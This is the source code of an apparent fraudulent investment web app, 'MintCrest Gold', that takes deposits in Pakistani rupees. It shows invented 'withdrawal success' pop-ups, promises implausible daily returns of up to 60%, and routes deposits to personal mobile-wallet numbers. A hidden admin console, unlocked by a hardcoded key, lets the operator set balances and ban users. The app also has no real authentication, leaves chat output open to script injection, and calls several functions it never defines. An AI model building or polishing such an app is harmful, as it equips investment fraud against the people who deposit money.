<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <script src="https://cdn.tailwindcss.com"></script>
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-firestore-compat.js"></script>
    <title>MintCrest Gold | Professional Asset Vault</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@300;400;600;800&display=swap');
        body { font-family: 'Plus Jakarta Sans', sans-serif; background: #000103; color: white; overflow-x: hidden; }
        .glass { background: rgba(255, 255, 255, 0.02); backdrop-filter: blur(30px); border: 1px solid rgba(255,255,255,0.07); }
        .active-tab { color: #3b82f6; border-top: 3px solid #3b82f6; background: linear-gradient(to top, rgba(59,130,246,0.1), transparent); }
        .page { display: none; animation: slideUp 0.3s ease; }
        .active-page { display: block; }
        @keyframes slideUp { from { opacity: 0; transform: translateY(15px); } to { opacity: 1; transform: translateY(0); } }
        .badge-pending { background: rgba(234, 179, 8, 0.1); color: #eab308; padding: 2px 4px; border-radius: 4px; font-size: 7px; font-weight: bold; text-transform: uppercase; }
        .badge-approved { background: rgba(34, 197, 94, 0.1); color: #4ade80; padding: 2px 4px; border-radius: 4px; font-size: 7px; font-weight: bold; text-transform: uppercase; }
        .badge-rejected { background: rgba(239, 68, 68, 0.1); color: #ef4444; padding: 2px 4px; border-radius: 4px; font-size: 7px; font-weight: bold; text-transform: uppercase; }
        
        /* Spin Wheel Style */
        .spin-wheel { width: 180px; height: 180px; border-radius: 50%; border: 5px solid #1e3a8a; position: relative; transition: 4s cubic-bezier(0.15, 0, 0.15, 1); background: conic-gradient(#1e40af 0deg 60deg, #3b82f6 60deg 120deg, #1e3a8a 120deg 180deg, #2563eb 180deg 240deg, #1d4ed8 240deg 300deg, #60a5fa 300deg 360deg); margin: 0 auto; }
        .wheel-pointer { position: absolute; top: -10px; left: 50%; transform: translateX(-50%); width: 0; height: 0; border-left: 10px solid transparent; border-right: 10px solid transparent; border-top: 20px solid #ef4444; z-index: 10; }
        
        /* Fake Popup Style */
        .fake-popup { position: fixed; bottom: 100px; left: 20px; right: 20px; z-index: 5000; transform: translateY(200%); transition: 0.5s; background: rgba(0,0,0,0.8); border-left: 4px solid #4ade80; }
        .show-popup { transform: translateY(0); }
        
        @keyframes marquee { 0% { transform: translateX(100%); } 100% { transform: translateX(-100%); } }
        .animate-marquee { display: inline-block; animation: marquee 15s linear infinite; white-space: nowrap; }
    </style>
</head>
<body class="h-screen flex flex-col">

    <div id="popup" class="fake-popup glass p-4 flex items-center gap-4 rounded-2xl">
        <div class="bg-green-500/20 p-2 rounded-full">💰</div>
        <div>
            <p id="pop-text" class="text-[9px] font-bold uppercase"></p>
            <p class="text-[7px] opacity-50 uppercase tracking-widest">Withdrawal Success • MintCrest</p>
        </div>
    </div>

    <div id="promo-ticker" class="hidden bg-blue-600/20 border-b border-blue-500/30 py-2 overflow-hidden z-[500]">
        <div class="animate-marquee text-[9px] font-black uppercase tracking-widest text-blue-400">
            📢 <span id="ticker-text">Welcome to MintCrest Gold - Secure Your Future Today!</span>
        </div>
    </div>

    <section id="auth-ui" class="fixed inset-0 z-[1000] bg-[#000103] flex items-center justify-center p-8 text-center">
        <div class="w-full max-w-sm">
            <h1 onclick="adminTap()" class="text-5xl font-black italic tracking-tighter mb-2 cursor-pointer uppercase">MINT<span class="text-blue-500">CREST</span></h1>
            <p class="text-gray-500 text-[8px] uppercase tracking-[0.4em] mb-12 font-bold italic">Official Digital Asset Vault</p>
            <div class="glass p-10 rounded-[3.5rem] border-t-2 border-blue-600 shadow-2xl">
                <input type="text" id="user-name" placeholder="Legal Full Name" class="w-full bg-white/5 p-5 rounded-2xl border border-white/10 outline-none text-center font-bold mb-5 focus:border-blue-500 transition-all">
                <button onclick="login()" class="w-full bg-blue-600 py-5 rounded-2xl font-black text-[10px] uppercase tracking-widest shadow-2xl active:scale-95 transition-all">Secure Access</button>
            </div>
        </div>
    </section>

    <main id="app-ui" class="hidden flex-1 overflow-y-auto pb-32">
        <div class="p-8 pb-2 flex justify-between items-end">
            <div>
                <p class="text-[8px] font-black text-blue-500 uppercase tracking-widest">Node User</p>
                <h1 class="text-2xl font-black tracking-tighter" id="u-display">--</h1>
            </div>
            <button onclick="changePage('more')" class="glass p-3 rounded-2xl relative">
                💬 <span id="chat-dot" class="hidden absolute top-2 right-2 w-2 h-2 bg-red-500 rounded-full"></span>
            </button>
        </div>

        <div id="p-home" class="page active-page p-6">
            <div class="glass p-10 rounded-[3rem] mb-6 border-l-8 border-blue-600 shadow-xl relative overflow-hidden">
                <p class="text-[9px] text-blue-400 font-extrabold mb-1 uppercase tracking-widest">Available Capital</p>
                <h2 class="text-5xl font-black tracking-tighter mb-4" id="v-bal">₨ 0</h2>
                <div id="countdown-display" class="text-[9px] font-black text-yellow-500 uppercase italic mb-6">System Idle...</div>
                
                <div class="flex gap-3">
                    <span class="text-[8px] bg-green-500/10 text-green-400 px-4 py-2 rounded-full font-bold border border-green-500/20 uppercase">Profit: <span id="v-profit">₨ 0</span></span>
                    <span id="tier-tag" class="text-[8px] bg-white/5 text-gray-400 px-4 py-2 rounded-full font-bold uppercase border border-white/5">No Active Fleet</span>
                </div>
            </div>

            <div class="grid grid-cols-2 gap-4 mb-6">
                <button onclick="changePage('wallet')" class="glass p-8 rounded-[2.5rem] text-center">📥 <span class="text-[9px] font-black block mt-2 uppercase tracking-widest">Deposit</span></button>
                <button onclick="changePage('withdraw')" class="glass p-8 rounded-[2.5rem] text-center">📤 <span class="text-[9px] font-black block mt-2 uppercase tracking-widest">Withdraw</span></button>
            </div>

            <div class="grid grid-cols-2 gap-4">
                <button id="daily-btn" onclick="claimDailyReward()" class="glass p-6 rounded-[2rem] border-b-4 border-green-500 text-center">
                    💰 <span class="text-[8px] font-black block mt-2 uppercase">Daily Reward</span>
                </button>
                <button onclick="changePage('spin')" class="glass p-6 rounded-[2rem] border-b-4 border-yellow-500 text-center">
                    🎡 <span class="text-[8px] font-black block mt-2 uppercase">Fortune Spin</span>
                </button>
            </div>
        </div>

        <div id="p-spin" class="page p-6 text-center">
            <h2 class="text-xl font-black italic uppercase text-yellow-500 mb-10 tracking-widest">Fortune Spin</h2>
            <div class="relative mb-10">
                <div class="wheel-pointer"></div>
                <div id="wheel" class="spin-wheel"></div>
            </div>
            <button id="spin-btn" onclick="executeSpin()" class="w-full bg-yellow-600 py-6 rounded-3xl font-black text-[10px] uppercase tracking-widest">Spin Now (24h)</button>
            <p id="spin-timer-txt" class="mt-4 text-[8px] font-bold text-gray-600 uppercase"></p>
        </div>

        <div id="p-invest" class="page p-6">
            <h2 class="text-center font-black italic mb-6 uppercase text-blue-500 text-xl tracking-widest">Investment Fleets</h2>
            <div id="plans-list" class="space-y-3 pb-10"></div>
        </div>

        <div id="p-more" class="page p-6 space-y-6">
            <div class="glass p-8 rounded-[3rem] border-t-4 border-yellow-500">
                <h3 class="text-yellow-500 font-black text-[11px] uppercase mb-2 text-center">Promo Center</h3>
                <input type="text" id="promo-input" placeholder="Enter Promo Code" class="w-full bg-white/5 p-4 rounded-2xl text-[10px] border border-white/10 text-center font-bold mb-4 uppercase">
                <button onclick="applyPromoRequest()" class="w-full bg-yellow-600 py-4 rounded-2xl font-black text-[10px] uppercase">Submit Code</button>
            </div>

            <div class="glass p-8 rounded-[3rem]">
                <h3 class="text-blue-500 font-black text-[11px] uppercase mb-4 text-center">Live Support</h3>
                <div id="chat-box" class="h-40 overflow-y-auto mb-4 space-y-2 text-[10px] p-2 bg-black/20 rounded-xl"></div>
                <div class="flex gap-2">
                    <input type="text" id="support-msg" placeholder="Your Message..." class="flex-1 bg-white/5 p-4 rounded-xl text-[10px] outline-none">
                    <button onclick="sendSupport()" class="bg-blue-600 px-6 rounded-xl font-black text-[10px]">SEND</button>
                </div>
            </div>

            <div class="glass p-8 rounded-[3rem] text-[8px] text-gray-500 font-bold uppercase leading-relaxed">
                <h4 class="text-blue-500 mb-3 text-[9px] text-center">Official Privacy Policy</h4>
                <p>• Verified by MintCrest Gold Enterprise.</p>
                <p>• Data encrypted via 256-bit Node Protocol.</p>
                <p>• Payouts guaranteed within 24 hours.</p>
            </div>
            
            <a href="https://chat.whatsapp.com/EbfTbr66JQLFEmjnxrReE3" class="block glass p-6 rounded-[2.5rem] text-center font-black text-[10px] text-green-500 uppercase">WhatsApp Community ↗️</a>
            <button onclick="logout()" class="w-full glass p-6 rounded-[2.5rem] text-center text-[10px] font-black text-red-500 uppercase">Terminate Session</button>
        </div>

        <div id="p-wallet" class="page p-6">
            <div class="glass p-10 rounded-[3.5rem] border-t-8 border-blue-600 text-center">
                <h3 class="font-black text-blue-500 mb-8 uppercase text-sm">Capital Funding</h3>
                <div class="space-y-3 mb-8 text-[10px] font-bold">
                    <div class="glass p-4 rounded-xl flex justify-between"><span>JazzCash/SadaPay</span><span>03705519562</span></div>
                    <div class="glass p-4 rounded-xl flex justify-between"><span>EasyPaisa</span><span>03379827882</span></div>
                </div>
                <input type="number" id="dep-amount" placeholder="Amount (PKR)" class="w-full bg-white/5 p-5 rounded-2xl mb-3 text-center outline-none">
                <input type="text" id="dep-trx" placeholder="Transaction ID" class="w-full bg-white/5 p-5 rounded-2xl mb-8 text-center uppercase outline-none">
                <button onclick="submitDeposit()" class="w-full bg-blue-600 py-6 rounded-2xl font-black uppercase text-[10px]">Verify Funding</button>
            </div>
        </div>

        <div id="p-withdraw" class="page p-6">
            <div class="glass p-10 rounded-[3.5rem] border-t-8 border-red-600 text-center">
                <h3 class="font-black text-red-500 mb-8 uppercase text-sm">Request Payout</h3>
                <input type="number" id="wd-amt" placeholder="Amount (PKR)" class="w-full bg-white/5 p-5 rounded-2xl mb-3 text-center outline-none">
                <input type="text" id="wd-acc" placeholder="Account Name & Number" class="w-full bg-white/5 p-5 rounded-2xl mb-8 text-center text-[10px] outline-none">
                <button onclick="submitWithdraw()" class="w-full bg-red-600 py-6 rounded-2xl font-black uppercase text-[10px]">Authorize Payout</button>
            </div>
        </div>
    </main>

    <div id="admin-panel" class="fixed inset-0 bg-[#000103] z-[5000] p-6 hidden overflow-y-auto">
        <div class="flex justify-between items-center mb-10">
            <h2 class="text-xl font-black text-blue-500 uppercase italic">Master Console</h2>
            <button onclick="closeAdmin()" class="bg-red-500/10 text-red-500 px-6 py-2 rounded-xl text-[10px] font-black">EXIT</button>
        </div>
        
        <div class="flex gap-2 mb-8 overflow-x-auto pb-2">
            <button onclick="showAdmTab('requests')" class="bg-blue-600 px-6 py-2 rounded-xl text-[9px] font-black uppercase">Orders</button>
            <button onclick="showAdmTab('chat')" class="bg-purple-600 px-6 py-2 rounded-xl text-[9px] font-black uppercase">Chat</button>
            <button onclick="showAdmTab('users')" class="glass px-6 py-2 rounded-xl text-[9px] font-black uppercase">Users</button>
            <button onclick="showAdmTab('broadcast')" class="bg-yellow-600 px-6 py-2 rounded-xl text-[9px] font-black uppercase">Broadcast</button>
        </div>

        <div id="adm-sec-requests" class="adm-tab space-y-3"></div>
        <div id="adm-sec-chat" class="adm-tab hidden space-y-3"></div>
        <div id="adm-sec-users" class="adm-tab hidden space-y-3"></div>
        
        <div id="adm-sec-broadcast" class="adm-tab hidden glass p-8 rounded-[3rem]">
            <textarea id="bc-msg" placeholder="App News Ticker..." class="w-full bg-white/5 p-5 rounded-2xl text-[10px] mb-4 h-24 font-bold"></textarea>
            <button onclick="sendBroadcast()" class="w-full bg-yellow-600 py-4 rounded-2xl font-black text-[10px] uppercase">🚀 Broadcast</button>
        </div>

        <div class="glass p-8 rounded-[3rem] mt-10">
            <h3 class="text-[9px] font-black uppercase mb-4 opacity-30 text-center italic">Manual Control</h3>
            <input type="text" id="adm-user" placeholder="User Name" class="w-full bg-white/5 p-4 rounded-xl mb-2 text-center text-[10px] font-bold">
            <input type="number" id="adm-val" placeholder="Amount" class="w-full bg-white/5 p-4 rounded-xl mb-4 text-center text-[10px] font-bold">
            <div class="grid grid-cols-2 gap-2">
                <button onclick="manualEdit('balance')" class="bg-blue-600 py-3 rounded-xl font-black text-[9px] uppercase">Add Bal</button>
                <button onclick="manualEdit('profit')" class="bg-green-600 py-3 rounded-xl font-black text-[9px] uppercase">Add Prof</button>
                <button onclick="banUser(true)" class="bg-red-600 py-3 rounded-xl font-black text-[9px] uppercase col-span-2 mt-2">Ban User</button>
                <button onclick="banUser(false)" class="bg-gray-600 py-3 rounded-xl font-black text-[9px] uppercase col-span-2">Unban User</button>
            </div>
        </div>
    </div>

    <nav id="bottom-nav" class="hidden glass border-t border-white/5 p-8 flex justify-around items-center fixed bottom-0 left-0 w-full z-[200] rounded-t-[4rem]">
        <button onclick="changePage('home')" id="n-home" class="active-tab text-xl">🏠</button>
        <button onclick="changePage('invest')" id="n-invest" class="text-xl">📈</button>
        <button onclick="changePage('more')" id="n-more" class="text-xl">⚙️</button>
    </nav>

    <script>
        const firebaseConfig = { apiKey: "AIzaSyDt3ChZHyDdtM4Ir1oXRZJUywcOiV30Wtg", authDomain: "investment-84f4e.firebaseapp.com", projectId: "investment-84f4e", storageBucket: "investment-84f4e.firebasestorage.app", messagingSenderId: "975293889308", appId: "1:975293889308:web:6d034a99cc966c75ff58d9" };
        firebase.initializeApp(firebaseConfig); const db = firebase.firestore();
        let user = null; let tapCount = 0;

        const plans = [
            { n: "Micro-Elite I", p: 200, r: 3, d: 30 }, { n: "Micro-Elite II", p: 500, r: 3.2, d: 30 },
            { n: "Bronze-S", p: 1000, r: 3.5, d: 30 }, { n: "Bronze-X", p: 2000, r: 3.8, d: 30 },
            { n: "Silver-S", p: 3000, r: 4.2, d: 30 }, { n: "Silver-X", p: 5000, r: 4.5, d: 30 },
            { n: "Gold-S", p: 7000, r: 5, d: 30 }, { n: "Gold-X", p: 10000, r: 5.5, d: 30 },
            { n: "Gold-Master", p: 15000, r: 6, d: 30 }, { n: "Platinum-S", p: 20000, r: 6.5, d: 30 },
            { n: "Platinum-X", p: 30000, r: 7, d: 30 }, { n: "Diamond-S", p: 40000, r: 7.5, d: 30 },
            { n: "Diamond-X", p: 50000, r: 8, d: 30 }, { n: "Royal-S", p: 75000, r: 9, d: 30 },
            { n: "Royal-Grand", p: 100000, r: 10, d: 30 },
            { n: "⚡ FLASH 24H", p: 500, r: 15, s: true }, { n: "🔥 NOVA", p: 2000, r: 18, s: true },
            { n: "⭐ VIP PASS", p: 8000, r: 20, s: true }, { n: "🚀 ROCKET", p: 15000, r: 25, s: true },
            { n: "👑 CROWN", p: 25000, r: 30, s: true }, { n: "🛸 NEBULA", p: 50000, r: 35, s: true },
            { n: "🐉 DRAGON", p: 150000, r: 60, s: true }, { n: "🔱 ZEUS", p: 100000, r: 50, s: true },
            { n: "🧿 ORACLE", p: 12000, r: 22, s: true }, { n: "🐺 WOLF", p: 3500, r: 16, d: 30 }
        ];

        async function login() {
            const name = document.getElementById('user-name').value.trim(); if(!name) return;
            const ref = db.collection("users").doc(name); const doc = await ref.get();
            if(doc.exists && doc.data().banned) return alert("Your account is banned!");
            if(!doc.exists) await ref.set({ name: name, balance: 0, profit: 0, time: Date.now(), activeTier: 0, tierROI: 0, lastReqTime: Date.now(), tierName: "Inactive", lastSpin: 0, lastDaily: 0, unread: false, banned: false });
            localStorage.setItem('mc_user', name);
            document.getElementById('u-display').innerText = name;
            startSync(name); startPopups();
            document.getElementById('auth-ui').classList.add('hidden'); document.getElementById('app-ui').classList.remove('hidden'); document.getElementById('bottom-nav').classList.remove('hidden');
            renderPlans();
        }

        function startSync(name) {
            db.collection("users").doc(name).onSnapshot(doc => { 
                if(doc.exists) { 
                    user = doc.data(); 
                    document.getElementById('v-bal').innerText = "₨ " + (user.balance || 0).toLocaleString(); 
                    document.getElementById('v-profit').innerText = "₨ " + (user.profit || 0).toLocaleString(); 
                    document.getElementById('tier-tag').innerText = user.tierName;
                    if(user.unread) document.getElementById('chat-dot').classList.remove('hidden');
                    checkTimers();
                } 
            });
            db.collection("messages").where("user", "==", name).orderBy("time").onSnapshot(snap => {
                const box = document.getElementById('chat-box'); box.innerHTML = '';
                snap.forEach(d => { const m = d.data(); box.innerHTML += `<div class="${m.side==='admin' ? 'text-blue-400 font-bold' : 'text-gray-400'}">● ${m.text}</div>`; });
                box.scrollTop = box.scrollHeight;
            });
            db.collection("app_data").doc("announcement").onSnapshot(doc => { if(doc.exists) { document.getElementById('promo-ticker').classList.remove('hidden'); document.getElementById('ticker-text').innerText = doc.data().message; } });
        }

        function renderPlans() {
            const list = document.getElementById('plans-list'); list.innerHTML = '';
            plans.forEach(p => {
                const isSpecial = p.s === true;
                list.innerHTML += `<div onclick="buyFleet(${p.p}, ${p.r}, '${p.n}')" class="glass p-5 rounded-[2.5rem] flex justify-between items-center active:scale-95 transition-all">
                    <div><h4 class="font-black text-[10px] uppercase ${isSpecial ? 'text-blue-400' : 'text-gray-400'}">${p.n}</h4><p class="text-[8px] text-green-400 font-bold uppercase">${p.r}% Daily Yield ${isSpecial ? '' : '• 30 Days'}</p></div>
                    <div class="font-black text-[12px]">₨ ${p.p.toLocaleString()}</div>
                </div>`;
            });
        }

        async function executeSpin() {
            const wheel = document.getElementById('wheel'); const deg = Math.floor(5000 + Math.random() * 5000);
            wheel.style.transform = `rotate(${deg}deg)`;
            document.getElementById('spin-btn').disabled = true;
            setTimeout(async () => {
                await db.collection("requests").add({ user: user.name, type: "Spin Reward Request", status: "pending", time: Date.now(), amount: 0 });
                await db.collection("users").doc(user.name).update({ lastSpin: Date.now() });
                alert("Spin Request Sent! Admin will add your bonus shortly sweetie! 😘");
            }, 4000);
        }

        async function claimDailyReward() {
            await db.collection("requests").add({ user: user.name, type: "Daily Bonus Request", status: "pending", time: Date.now(), amount: 0 });
            await db.collection("users").doc(user.name).update({ lastDaily: Date.now() });
            alert("Daily Claim Sent! Wait for Admin Approval. ❤️");
        }

        function checkTimers() {
            const now = Date.now();
            const spinD = (user.lastSpin + 86400000) - now;
            document.getElementById('spin-btn').disabled = spinD > 0;
            document.getElementById('spin-timer-txt').innerText = spinD > 0 ? "Next Spin in " + Math.floor(spinD/3600000) + "h" : "Ready to Spin!";
            
            const dailyD = (user.lastDaily + 86400000) - now;
            document.getElementById('daily-btn').disabled = dailyD > 0;
        }

        async function sendSupport() {
            const m = document.getElementById('support-msg').value.trim(); if(!m) return;
            await db.collection("messages").add({ user: user.name, text: m, side: "user", time: Date.now() });
            document.getElementById('support-msg').value = '';
        }

        function startPopups() {
            const users = ["Ahmed", "Sajid", "Maria", "Usman", "Zoya", "Kashif", "Hamza", "Fatima"];
            setInterval(() => {
                const u = users[Math.floor(Math.random()*users.length)];
                const a = Math.floor(Math.random()*20000) + 500;
                document.getElementById('pop-text').innerText = `${u} withdrew ₨ ${a.toLocaleString()}`;
                document.getElementById('popup').classList.add('show-popup');
                setTimeout(() => document.getElementById('popup').classList.remove('show-popup'), 4000);
            }, 15000);
        }

        // --- Master Console Functions ---
        function adminTap() { tapCount++; if(tapCount >= 4) { if(prompt("Access Key:") === "mint786") { document.getElementById('admin-panel').classList.remove('hidden'); syncAdmin(); } tapCount=0; } }
        function closeAdmin() { document.getElementById('admin-panel').classList.add('hidden'); }
        function showAdmTab(t) { document.querySelectorAll('.adm-tab').forEach(s=>s.classList.add('hidden')); document.getElementById('adm-sec-'+t).classList.remove('hidden'); }
        
        async function syncAdmin() {
            db.collection("requests").where("status", "==", "pending").onSnapshot(snap => {
                const list = document.getElementById('adm-sec-requests'); list.innerHTML = '';
                snap.forEach(doc => { const d = doc.data(); list.innerHTML += `<div class="glass p-4 rounded-xl flex justify-between items-center text-[8px] font-black uppercase"><div>${d.user}<br>${d.type} (Rs ${d.amount})</div><div class="flex gap-2"><button onclick="handleReq('${doc.id}','${d.user}',${d.amount},'approved','${d.type}')" class="bg-green-600 px-3 py-1 rounded">OK</button></div></div>`; });
            });
            db.collection("messages").orderBy("time", "desc").limit(10).onSnapshot(snap => {
                const list = document.getElementById('adm-sec-chat'); list.innerHTML = '';
                snap.forEach(doc => { const d = doc.data(); list.innerHTML += `<div class="glass p-3 rounded-xl text-[8px]"><b>${d.user}:</b> ${d.text} <button onclick="adminReply('${d.user}')" class="text-blue-400 ml-2">REPLY</button></div>`; });
            });
        }

        async function adminReply(u) { const m = prompt("Reply to " + u); if(m) { await db.collection("messages").add({ user: u, text: m, side: "admin", time: Date.now() }); await db.collection("users").doc(u).update({ unread: true }); } }
        async function banUser(s) { const u = document.getElementById('adm-user').value; await db.collection("users").doc(u).update({ banned: s }); alert("Status Updated!"); }
        async function manualEdit(f) { const u = document.getElementById('adm-user').value; const v = parseInt(document.getElementById('adm-val').value); const ref = db.collection("users").doc(u); const d = await ref.get(); if(d.exists) await ref.update({ [f]: (d.data()[f]||0)+v }); alert("Done!"); }
        async function handleReq(id, u, amt, act, type) { 
            const ref = db.collection("users").doc(u); const doc = await ref.get();
            let finalAmt = amt;
            if(type.includes('Bonus') || type.includes('Reward') || type.includes('Promo')) { finalAmt = parseInt(prompt("Enter Amount to give:")); if(!finalAmt) return; }
            if(act==='approved') await ref.update({ balance: (doc.data().balance||0) + finalAmt });
            await db.collection("requests").doc(id).update({ status: act, amount: finalAmt });
        }

        function changePage(p) { document.querySelectorAll('.page').forEach(pg=>pg.classList.remove('active-page')); document.querySelectorAll('nav button').forEach(b=>b.classList.remove('active-tab')); document.getElementById('p-'+p).classList.add('active-page'); if(document.getElementById('n-'+p)) document.getElementById('n-'+p).classList.add('active-tab'); }
        function logout() { localStorage.removeItem('mc_user'); location.reload(); }
        window.onload = () => { if(localStorage.getItem('mc_user')) { document.getElementById('user-name').value = localStorage.getItem('mc_user'); login(); } };
    </script>
</body>
</html>
